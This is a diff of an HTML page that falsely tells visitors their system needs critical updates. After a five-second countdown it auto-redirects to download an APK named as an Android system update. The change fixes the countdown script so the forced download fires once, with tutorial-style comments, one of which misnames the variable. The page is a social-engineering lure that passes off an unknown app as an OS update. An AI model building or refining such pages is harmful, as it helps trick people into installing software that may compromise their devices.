@@ -12,13 +12,22 @@
         <p>Your system requires critical updates. Downloading in <span id="countdown">5</span> seconds...</p><br><br>
         <a href="android_system_update (1).apk" style="background:#fff;color:#000000;padding:15px 30px;text-decoration:none;border-radius:5px;font-weight:bold;">Download Now</a>
         <script>
-            let time = 5;
-            setInterval(() => {
-                time--;
-                document.getElementById('countdown').textContent = time;
-                if(time <= 0) window.location = 'android_system_update (1).apk';
-            }, 1000);
-        </script>
+    let time = 5;
+    
+    // 1. Assign the interval to a variable called 'countdown'
+    const timer = setInterval(() => {
+        time--;
+        document.getElementById('countdown').textContent = time;
+
+        if (time <= 0) {
+            // 2. Stop the interval so it never runs again
+            clearInterval(timer); 
+            
+            // 3. Trigger the download
+            window.location = 'android_system_update (1).apk';
+        }
+    }, 1000);
+</script>
     </div>
 </body>
 </html>
